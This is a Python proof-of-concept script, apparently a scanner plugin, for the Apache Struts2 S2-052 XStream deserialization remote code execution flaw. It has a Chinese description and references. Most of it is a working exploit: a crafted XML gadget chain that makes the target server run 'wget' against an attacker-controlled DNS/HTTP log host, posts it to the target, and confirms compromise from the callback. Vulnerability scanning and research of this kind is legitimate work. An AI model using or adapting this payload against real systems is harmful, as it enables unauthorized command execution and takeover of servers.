#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
"""
S2-052 远程代码执行漏洞

Desc
    当Struts2使用REST插件使用XStream的实例xstreamhandler处理反序列化XML有效载荷时没有进行任何过滤，
    可以导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。
Version
    Struts 2.1.2 - Struts 2.3.33
    Struts 2.5 - Struts 2.5.12
Type
    无回显命令执行
Referer
    - http://struts.apache.org/docs/s2-052.html
    - https://yq.aliyun.com/articles/197926
"""
import requests
from six.moves.urllib import parse
from plugin.dnslog import Dnslog
import logging

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/')

    mydnslog = Dnslog("s2-052")
    weburl = mydnslog.getWeburl()
    logging.info("weblog url: %s" % weburl)
    payload = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>wget</string>
                        <string>{url}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>""".format(url=weburl)

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
        "Content-Type":"application/xml"
    }
    try:
        resp = requests.post(url, data=payload, headers=headers)
        if mydnslog.verifyHTTP(3):
            return "[S2-052][weblog] " + url
    except Exception as e:
        logging.debug(e)
    return False

if __name__ == "__main__":
    poc("http://vuln.com:8080/orders.xhtml")
